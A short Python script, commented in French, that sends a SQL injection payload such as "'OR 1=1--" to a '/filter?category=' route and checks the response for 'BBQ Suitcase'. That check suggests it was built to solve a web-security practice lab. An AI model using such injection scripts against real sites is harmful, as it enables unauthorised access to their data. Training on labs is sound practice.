import requests
import urllib3
import sys

# Désactivation des avertissements pour les connexions HTTPS non sécurisées.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def lancer_exploit(mon_url, mon_payload):
    # Construction de l'URL exploitée en utilisant le payload fourni.
    route = '/filter?category='
    exploit_url = mon_url + route + mon_payload  
    #print(exploit_url)  # Affiche l'URL pour le débogage et la vérification.

    try:
        # Envoi d'une requête GET à l'URL exploitée sans vérifier le certificat SSL.
        exploit = requests.get(exploit_url, verify=False)

        # Vérifie si la réponse contient une indication d'une injection réussie.
        if "BBQ Suitcase" in exploit.text:
            return True  
        else:
            return False 

    except requests.exceptions.RequestException as erreur:
        # Gère les exceptions liées aux requêtes HTTP (par exemple, erreurs de connexion, timeouts).
        print(f"Erreur rencontrée : {erreur}")

# Vérifie si le script est exécuté directement.
if __name__ == "__main__":
    try:
        # Récupère les arguments de ligne de commande pour l'URL et le payload.
        m_url = sys.argv[1]  # L'URL cible.
        m_payload = sys.argv[2]  # Le payload SQL pour l'injection.

        # Appelle la fonction pour lancer l'exploit et stocke le résultat.
        final_exploit = lancer_exploit(m_url, m_payload)
        
        # Affiche le résultat en fonction de l'état de l'injection.
        if final_exploit:
            print(f"[+] Injection SQL effectuée avec succès")
        else:
            print(f"[-] Erreur : pas d'injection SQL effectuée")
        
    except IndexError:
        # Gère les erreurs lorsque les arguments nécessaires ne sont pas fournis.
        print(f"[+] > Utilisation : {sys.argv[0]} url payload")
        print(f"[+] > Exemple     : {sys.argv[0]} 'www.example.com' \"'OR 1=1--\" ")
